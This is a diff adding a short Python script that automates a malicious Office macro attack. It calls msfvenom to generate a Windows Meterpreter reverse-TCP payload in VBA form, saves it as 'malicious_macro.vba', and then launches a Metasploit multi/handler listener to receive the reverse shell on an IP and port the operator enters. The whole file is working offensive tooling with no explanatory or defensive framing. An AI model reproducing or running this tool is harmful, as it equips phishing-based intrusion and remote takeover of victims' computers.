@@ -1,0 +1,30 @@
+import os
+import subprocess
+
+def generate_msfvenom_macro(lhost, lport):
+    output_file = "malicious_macro.vba"
+    msfvenom_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f vba > {output_file}"
+    os.system(msfvenom_command)
+    print(f"Malicious macro saved as {output_file}")
+
+def setup_metasploit_listener(lhost, lport):
+    msf_listener_script = f"""
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST {lhost}
+set LPORT {lport}
+exploit
+"""
+    script_file = "msf_listener.rc"
+    with open(script_file, "w") as f:
+        f.write(msf_listener_script)
+
+    msfconsole_command = f"msfconsole -r {script_file}"
+    subprocess.Popen(msfconsole_command, shell=True)
+
+if __name__ == "__main__":
+    lhost = input("Enter your IP address: ")
+    lport = input("Enter your desired port number: ")
+
+    generate_msfvenom_macro(lhost, lport)
+    setup_metasploit_listener(lhost, lport)
